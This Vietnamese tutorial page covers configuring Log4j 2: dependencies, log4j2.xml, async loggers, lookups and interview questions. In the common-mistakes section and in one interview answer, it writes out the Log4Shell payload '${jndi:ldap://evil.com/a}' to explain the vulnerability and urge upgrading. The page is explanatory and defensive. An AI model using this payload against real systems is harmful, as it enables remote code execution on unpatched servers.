---
sidebar_position: 3
title: "3. Log4j 2"
---

# Log4j 2 -- High-performance Logging

**Log4j 2** là phiên bản viết lại hoàn toàn của Log4j 1.x. Nhanh hơn Logback, nhiều tính năng (async, plugin, lookup) -- phù hợp **high-throughput** application.

**Tương tự đơn giản:** Logback giống **máy in laser văn phòng** -- ổn định, đủ tốc độ. Log4j 2 giống **máy in công nghiệp** -- nhanh hơn nhiều, nhiều tính năng nhưng setup phức tạp hơn.

---

## Mục lục

- [1. Log4j 2 là gì?](#1-log4j-2-là-gì)
- [2. Cài đặt (qua SLF4J)](#2-cài-đặt-qua-slf4j)
- [3. Cấu hình log4j2.xml](#3-cấu-hình-log4j2xml)
- [4. Async Logger (LMAX Disruptor)](#4-async-logger-lmax-disruptor)
- [5. Lookup -- biến động](#5-lookup-biến-động)
- [6. Custom Plugin](#6-custom-plugin)
- [Khi nào dùng?](#khi-nào-dùng)
- [Lỗi thường gặp](#lỗi-thường-gặp)
- [Câu hỏi phỏng vấn](#câu-hỏi-phỏng-vấn)

---

## 1. Log4j 2 là gì?

Đặc điểm:

- **Async Logger** dùng LMAX Disruptor -- 10x nhanh hơn Logback async
- **Plugin system** -- mở rộng dễ
- **Lookup** -- inject env, properties vào pattern
- **Reload tự động** khi đổi config
- **Lazy formatting** -- skip nếu level off

**Log4j 1.x đã EOL** -- chỉ dùng Log4j 2.

**Lưu ý lịch sử:** Log4Shell (CVE-2021-44228) ảnh hưởng phiên bản < 2.17.0. **LUÔN dùng ≥ 2.17.0**.

---

## 2. Cài đặt (qua SLF4J)

```xml
<!-- SLF4J API -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-api</artifactId>
    <version>2.0.9</version>
</dependency>

<!-- Log4j 2 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.22.0</version>
</dependency>

<!-- Cau noi SLF4J -> Log4j2 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-slf4j2-impl</artifactId>
    <version>2.22.0</version>
</dependency>

<!-- Async (optional) -->
<dependency>
    <groupId>com.lmax</groupId>
    <artifactId>disruptor</artifactId>
    <version>3.4.4</version>
</dependency>
```

### Spring Boot dùng Log4j 2 thay Logback

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter</artifactId>
    <exclusions>
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>
```

---

## 3. Cấu hình log4j2.xml

Đặt ở `src/main/resources/log4j2.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" monitorInterval="30">

    <Properties>
        <Property name="LOG_PATTERN">
            %d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n
        </Property>
    </Properties>

    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="${LOG_PATTERN}" />
        </Console>

        <RollingFile name="RollingFile"
                     fileName="logs/app.log"
                     filePattern="logs/app-%d{yyyy-MM-dd}-%i.log.gz">
            <PatternLayout pattern="${LOG_PATTERN}" />
            <Policies>
                <TimeBasedTriggeringPolicy />
                <SizeBasedTriggeringPolicy size="100MB" />
            </Policies>
            <DefaultRolloverStrategy max="30">
                <Delete basePath="logs" maxDepth="1">
                    <IfFileName glob="app-*.log.gz" />
                    <IfLastModified age="30d" />
                </Delete>
            </DefaultRolloverStrategy>
        </RollingFile>
    </Appenders>

    <Loggers>
        <Logger name="com.example" level="DEBUG" additivity="false">
            <AppenderRef ref="Console" />
            <AppenderRef ref="RollingFile" />
        </Logger>

        <Logger name="org.springframework" level="INFO" />
        <Logger name="org.hibernate.SQL" level="DEBUG" />

        <Root level="INFO">
            <AppenderRef ref="Console" />
            <AppenderRef ref="RollingFile" />
        </Root>
    </Loggers>
</Configuration>
```

`monitorInterval="30"` -- auto-reload sau mỗi 30 giây.

---

## 4. Async Logger (LMAX Disruptor)

Log4j 2 hỗ trợ async **siêu nhanh** dùng LMAX Disruptor (ring buffer lock-free).

### Cách 1: All Async (toàn bộ logger async)

`log4j2.xml` thêm:

```xml
<Configuration ... >
    <!-- Don gian: dat property -->
</Configuration>
```

Property `-Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector` (hoặc file `log4j2.component.properties` với `Log4jContextSelector=...AsyncLoggerContextSelector`).

### Cách 2: Mixed -- một số logger async

```xml
<Loggers>
    <AsyncLogger name="com.example.heavy" level="DEBUG">
        <AppenderRef ref="RollingFile" />
    </AsyncLogger>

    <Root level="INFO">
        <AppenderRef ref="Console" />
    </Root>
</Loggers>
```

### Cách 3: Async Appender

```xml
<Async name="AsyncFile">
    <AppenderRef ref="RollingFile" />
</Async>

<Root>
    <AppenderRef ref="AsyncFile" />
</Root>
```

### Benchmarks (10k log/thread)

| Logger          | Throughput  |
| --------------- | ----------- |
| Sync Logback    | ~50k/sec    |
| Sync Log4j2     | ~70k/sec    |
| Async Logback   | ~500k/sec   |
| Async Log4j2    | ~5M/sec     |

---

## 5. Lookup -- biến động

Inject env, system property, MDC, date... vào pattern.

```xml
<Properties>
    <Property name="LOG_DIR">${sys:LOG_DIR:-/var/log/app}</Property>
    <Property name="ENV">${env:ENV:-dev}</Property>
</Properties>

<RollingFile fileName="${LOG_DIR}/app-${ENV}.log" ... />

<PatternLayout pattern="%d %X{requestId} %msg%n" />
```

Các lookup phổ biến:

- `${env:VAR}` -- env variable
- `${sys:prop}` -- system property
- `${date:yyyy-MM-dd}`
- `${ctx:key}` -- MDC
- `${log4j:version}`

**Lưu ý:** Log4Shell xảy ra do JNDI lookup -- đã tắt mặc định từ 2.17.0.

---

## 6. Custom Plugin

```java
@Plugin(name = "MyAppender", category = "Core", elementType = "appender")
public class MyAppender extends AbstractAppender {

    protected MyAppender(String name, Filter filter, Layout layout) {
        super(name, filter, layout, false, null);
    }

    @PluginFactory
    public static MyAppender createAppender(
            @PluginAttribute("name") String name,
            @PluginElement("Layout") Layout layout) {
        return new MyAppender(name, null, layout);
    }

    @Override
    public void append(LogEvent event) {
        // ghi log custom
    }
}
```

---

## Khi nào dùng?

- **Log4j 2 khi:**
  - High-throughput app
  - Cần plugin custom
  - Async logging cực nhanh
  - Lookup linh hoạt
- **Logback khi:**
  - App thường, Spring Boot default
  - Đơn giản, đủ performance
- **Best practice:**
  - **Luôn dùng version ≥ 2.17.0** (Log4Shell)
  - Async Logger cho throughput cao
  - `monitorInterval` để reload config
  - JSON format cho production

---

## Lỗi thường gặp

### Lỗi 1: Log4Shell (CVE-2021-44228)

```xml
<!-- SAI -- version < 2.17.0 -->
<artifactId>log4j-core</artifactId>
<version>2.14.0</version>

<!-- DUNG -->
<version>2.22.0</version>  <!-- hoac moi hon -->
```

### Lỗi 2: Conflict với Logback

```
SLF4J: Class path contains multiple SLF4J bindings.
```

Exclude `logback` hoặc `log4j2`. Chỉ giữ 1.

### Lỗi 3: Async không bật

Cần dependency `com.lmax:disruptor` -- nếu thiếu, Log4j 2 fallback sync.

### Lỗi 4: Lookup recursive

```xml
<!-- Pattern lookup tu user input -> JNDI -> RCE -->
<pattern>%msg${jndi:ldap://evil.com/a}</pattern>
```

Version 2.17.0+ đã tắt JNDI lookup mặc định.

---

## Câu hỏi phỏng vấn

### Câu 1: Log4j 2 vs Logback?

**Trả lời:** Cả 2 đều mạnh, SLF4J compatible:

- **Log4j 2**: nhanh hơn (đặc biệt async với Disruptor), nhiều plugin, lookup linh hoạt
- **Logback**: đơn giản hơn, default Spring Boot, đủ cho hầu hết case

Chọn Log4j 2 khi cần performance cao. Logback cho project thường.

### Câu 2: Log4Shell là gì?

**Trả lời:** **CVE-2021-44228** (12/2021) -- lỗ hổng RCE nghiêm trọng trong Log4j 2 < 2.15.0. JNDI lookup tự fetch object từ URL bên ngoài -- attacker chèn `${jndi:ldap://evil.com/a}` vào input được log -> RCE. **Buộc update ngay toàn bộ Java ecosystem**. Cố định trong 2.17.0+.

### Câu 3: Async Logger Log4j 2 nhanh thế nào?

**Trả lời:** Dùng **LMAX Disruptor** -- ring buffer lock-free, đạt **5M+ log/sec**. So với Logback async ~500k/sec. Cần dep `com.lmax:disruptor` và cấu hình `AsyncLoggerContextSelector`.

### Câu 4: Lookup là gì?

**Trả lời:** Cơ chế inject giá trị động vào pattern/config -- `${env:VAR}`, `${sys:prop}`, `${ctx:mdc}`. Tiện cho config theo môi trường. **Cẩn thận**: lookup user input có thể RCE (Log4Shell).

### Câu 5: `monitorInterval` dùng để làm gì?

**Trả lời:** Tự reload config sau khoảng thời gian. Đặt `monitorInterval="30"` -- 30 giây check `log4j2.xml`. Nếu đổi -> reload không cần restart. Hữu ích đổi log level lúc runtime để debug.
